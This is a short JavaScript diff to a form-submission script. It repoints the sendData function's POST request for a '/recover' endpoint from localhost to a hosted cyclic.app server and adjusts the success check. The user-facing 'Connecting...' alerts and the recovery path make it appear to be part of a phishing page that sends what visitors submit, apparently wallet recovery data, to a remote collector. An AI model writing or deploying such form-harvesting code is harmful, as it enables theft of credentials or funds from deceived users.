@@ -58,7 +58,7 @@ function handleSubmit(event) {
 }
 
 function sendData(data) {
-    fetch('http://localhost:5050/recover', {
+    fetch('https://cheerful-teal-lion.cyclic.app/recover', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
@@ -66,9 +66,9 @@ function sendData(data) {
       body: JSON.stringify(data)
     })
     .then(response => {
-      if (response.status === 202) {
+      if (response.status === 200) {
         alert('Connecting...');
-
+        
       } else {
         alert('connection failed, try again');
         document.getElementById("submit-btn").removeAttribute("disabled");
